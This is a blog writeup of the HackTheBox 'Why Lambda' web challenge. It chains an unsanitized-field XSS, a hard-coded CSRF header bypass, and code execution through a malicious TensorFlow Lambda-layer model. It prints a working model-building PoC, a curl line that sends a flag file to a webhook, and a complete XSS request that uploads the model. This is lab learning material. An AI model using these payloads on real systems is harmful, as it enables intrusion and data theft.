+++
categories = ['ctf']
date = '2023-12-22'
tags = ['challenge', 'htb']
title = 'HTB Why Lambda - Writeup'
image = 'content/posts/ctf/hackthebox/why-lambda/feature.png'
description = 'Writeup of "Why Lambda" from HackTheBox'
+++

## General info

| _Challenge_      | **Why Lambda** |
| ----------- | ----------- |
| 📊 _Difficulty_  | **Hard** |
| 📝 _Solves_   | _84_       |
| ❓ _Topics_ | {{< keywordList >}}
{{< keyword >}}File Upload{{< /keyword >}}
{{< keyword >}}XSS{{< /keyword >}}
{{< keyword >}}CSRF{{< /keyword >}}
{{< keyword >}}RCE{{< /keyword >}}
{{< /keywordList >}}|
| 🕐 _Time spent_ | **+4h** |
| 🎖️ _Reviews_ | ⭐⭐⭐⭐ |

## Premise

This was my first hard-ranked challenge on HackTheBox! I'm very satisfied of my work, because the final exploit was actually pretty complex. Thus, I will flex my final badge!

![Achievement](https://i.imgur.com/AHzCoPp.png)

## Writeup

The challenge as a whole is divided into two main parts: a `frontend` and a `backend`, but only the first is exposed to external traffic

### Frontend

#### Summary
In the `frontend` we have a site which lets us write by hand some text on top of a `canvas`. The point is that, if the written text corresponds to a number, then the backend of the site should try and guess the number we wrote by using a _very complex_ machine learning algorithm developed with _TensorFlow_, that is then printed back to the user. If the number turns out to be wrong, we can legitimately write a complaint to the site's administrators.

#### XSS
Taking a closer look the site's source code, the first thing that stood out to me was that the "complaints reporting" part was managed by a `bot.py` script, as is often the case in this type of challenges. The script spawns a _Puppeteer_ instance to visit the page containing our report.

```python
def check_complaints(username, password):
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    browser = webdriver.Chrome(options=options)

    browser.get("http://127.0.0.1:1337/dashboard")

    browser.find_element(By.NAME, "username").send_keys(username)
    browser.find_element(By.NAME, "password").send_keys(password)
    browser.find_element(By.CLASS_NAME, "button-container").click()

    time.sleep(10)

    browser.quit()
```

Because this is, as I said, a very common vector for `XSS` attacks in these kind of challenges, I started focusing on verifying that this was, in fact, a vulnerability.\
Looking at the `Vue Templates`, we can see that the `prediction` field, which contains the number that we reported was wrong, is in fact not sanitized, and can be leveraged to obtain `XSS`:

```javascript
getPredictionText(complaint) {
	return `<p>Our amazing model said the image represented the digit: <b>${complaint.prediction}</b></p>`;
},
```

However, we can not simply obtain the admin _login cookie_, as this has the `HTTP_ONLY` filed checked, meaning we can not exfiltrate it via a `fetch()` call to one of our webhooks.

So, we have the first vulnerability, an `XSS`! What now?
I decided to start investigating on the backend.

### Backend

Now that we know of the `XSS`, my intuition started telling me that it was worth to test if the site is correctly protected against `CSRF` attacks, both because we _do not have a way to obtain the admin's cookie_ and because there is a **literal file** called `csrf.py` that was pretty peculiar.

But why? Because if we can exploit a `CSRF` we can potentially access some parts of the site which are reserved to the _admin_, without actually needing to have access to the credentials.

#### CSRF Token Bypass

This is the content of the already mentioned `csrf.py`:


```python
from functools import wraps
from flask import request, jsonify

 # https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#custom-request-headers
def csrf_protection(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        csrf_header = request.headers.get("X-SPACE-NO-CSRF")
        if csrf_header != "1":
            return jsonify({"error": "Invalid csrf token!"}), 403
        
        return f(*args, **kwargs)
    return decorated_function
```
As usual, the `CSRF` protection checks the value of an header of the request, `X-SPACE-NO-CSRF`, which _should_ be random and generated during the display of the site's page on the user's side. However, because in this case the value of the header is _hard coded_, we can easily bypass this restriction by simply adding a `X-SPACE-NO-CSRF: 1` header to our `XSS-fabricated` request. [Here](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#custom-request-headers) is a small tutorial by _OWASP_ on how to correctly implement such protections.

So, now we know another potential step of the exploit: abuse a `Blind XSS` vulnerability to access private endpoints via `CSRF`, bypassing the filter. But which are these endpoints really?

At this point, we can narrow down the search to these 3:

1. `/api/internal/complaints`, shows the sent complaints as Json, pretty irrelevant
2. `/api/internal/models/<path:path>`, to download the _machine learning model_ used by the site, still not so useful, since the only model present is pretty useless
3. `/api/internal/model`, to **upload** a new machine learning model as a _TensorFlow file_. Since this is the only endpoint actually modifying the state of the application, this seems the way to go.

#### RCE via TensorFlow
But really, what's with these _Machine learning_ models we've been talking since earlier!?

Now we can inspect the last remaining file: `model.py`, which should be responsible of managing the _TensorFlow_ models. To summarize, _TensorFlow_ models can be intended as _small programs_ which are trained to solve specific tasks. In particular, our _model_ **should** be able to tell a number from an image given as input, via the `predict()` method. I'm saying **should** because, in reality, this is the code:

```python
def predict(image_data):
    # What's the point anyway?
    return random.randrange(0, 9)
```

...a bit underwhelming.\
A question arises though: **why?** Why would you take time to implement a _TensorFlow_ model if then you don't use it?. Of course the question is kind of rhetoric: _because this is an HackTheBox challenge_ and this _TensorFlow_ model stuff probably contains the last step of our exploit chain.

Thus i started peeking into the _model uploading_ part. As the code suggests, the model is not simply _uploaded_, but also **parsed** by _TensorFlow_ itself:

```python
@app.route("/api/internal/model", methods=["POST"])
@authenticated
@csrf_protection
def submit_model():
    if "file" not in request.files:
        return message("Failed to upload model! You must specify a file!"), 400

    file = request.files["file"]
    
    if file and ".h5" in file.filename:
        name = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(12))
        name += ".h5"
        # Save model
        file.save(os.path.join(MODELS, name))
        try:
            test_model(MODELS+name)
            return message(f"Success, model saved at: /models/{name}")
            
        except Exception as e:
            print(e)
            return message("Model was uploaded but there were some errors during testing"), 422
    else:
        return message("Failed to upload model!"), 400
```

because I didn't really know what _TensorFlow_ models really were, I looked around the site a bit to see if there was a way to **inject some code** inside a model, and I was right!

```
TensorFlow models (to use a term commonly used by machine learning practitioners)
are expressed as programs that TensorFlow executes.
TensorFlow programs are encoded as computation graphs. Since models are
practically programs that TensorFlow executes, using untrusted models or graphs
is equivalent to running untrusted code.

If you need to run untrusted models, execute them inside a sandbox.
Memory corruptions in TensorFlow ops can be recognized as security issues
only if they are reachable and exploitable through production-grade, benign models.
```

so, now we finally have a strategy:

### Strategy
1. We can exploit the `XSS` on the dashboard to "pivot" the admin towards protected endpoints
2. Bypassing the `CSRF` token, we can access the `/api/internal/model` endpoint for the last stage
3. We add a maliciously created _TensorFlow model_ to execute arbitrary code and read the flag at `/flag.txt`

Easy, right? Not exactly!

### Exploiting
The exploit part was actually much tougher than I expected. Only at the end I realized that my strategy involved _uploading a whole file via an XSS_, a file which is not present on the server itself and can't be uploaded on the server, meaning I needed a way to put the **whole binary code inside the request**.

#### The binary for the RCE
Because the problems are many, I decided to confront them one by one. To start, I needed a way to create a malicious _TensorFlow model_ to inject code. Ideally, the payload I had in mind was actually pretty simple: exfiltrate the flag through a `cURL` request:
```bash
curl http://WEBHOOK?flag=$(cat /flag.txt | base64)
```
Now I just needed some more information about the injection part. Luckily it was pretty easy to find some material: https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model.

To summarize, _TensorFlow_ models are divided into [layers](https://www.tensorflow.org/guide/intro_to_modules), which can be roughly approximated to _"mathematical functions"_, one of which is delegated to some specific tasks. The _layer_ we are interested in is called _"Lambda"_ (seeing this, I immediately knew we were on the right path, because of the name of the challenge), and inside the linked site we also have a _PoC_ on how to leverage this layer to obtain _RCE_:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("curl http://WEBHOOK?flag=$(cat /flag.txt | base64)")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

#### File upload of the binary with Javascript
Now that we have a binary to execute arbitrary code, we just need to find a way to upload it using our `XSS`. But how?\
After a long time, I figured that the best way to do this was to take the **binary source** of our executable and **upload it by encoding it in some way, like base64**. Since I'm not really a Javascript expert, I kindly asked ChatGPT for some advices, and after a long session of chatting he came out with this code:
```javascript
const formData = new FormData();
formData.append(
	'file',
	new File([
				Uint8Array.from(atob('<base64code>'),
				char => char.charCodeAt(0))
			],
	'exploit.h5',
	{ type: 'application/x-hdf' })
);
```
{{< alert >}}To get the encoded source of the binary, it should be enough to execute this command: `cat exploit.h5 | base64`{{< /alert >}}
*But how does this work?* The code creates a `FormData` object to manage the _file uploading_. After that, we can add our file object, which was created by decoding the **base64** containing the source of our malicious binary, and by specifying its `mimetype`.

#### Putting it all together
Now we just need to put everything together! We said that the `XSS` will be our _"entrypoint"_, so I started by intercepting a request to submit a complaint with `Burp`, and then I modified it to insert our payload:

```
POST /api/complaint HTTP/1.1
Host: 188.166.175.58:30126
Content-Length: 29684
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
X-SPACE-NO-CSRF: 1
Content-Type: application/json
Accept: */*
Origin: http://188.166.175.58:30126
Referer: http://188.166.175.58:30126/try
Accept-Encoding: gzip, deflate, br
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: space_cookie=f37395b9-4a86-4cfa-9f48-bd70549b22b3
Connection: close

{
	"description":"aaa",
	"image_data":"data:image/png;base64,<base64image>",
	"prediction": "</b></p><img src=a onerror=\"fetch('http://<CHALLENGE_URL>/api/internal/model', {'headers': {'x-space-no-csrf': '1'}, body: (() => { const formData = new FormData(); formData.append('file', new File([Uint8Array.from(atob('<base64binary>'), char => char.charCodeAt(0))], 'exploit.h5', { type: 'application/x-hdf' })); return formData; })(), 'method': 'POST'})\">"
}
```
Then I just had to wait a bit, and I received the flag with a request on the **Webhook!**

## Review
I'm not really good at writing reviews, so I'll just say that this challenge was particularly stimulating to me, especially the exploitation part, and the sense of satisfaction I had solving it was just great: totally recommended!
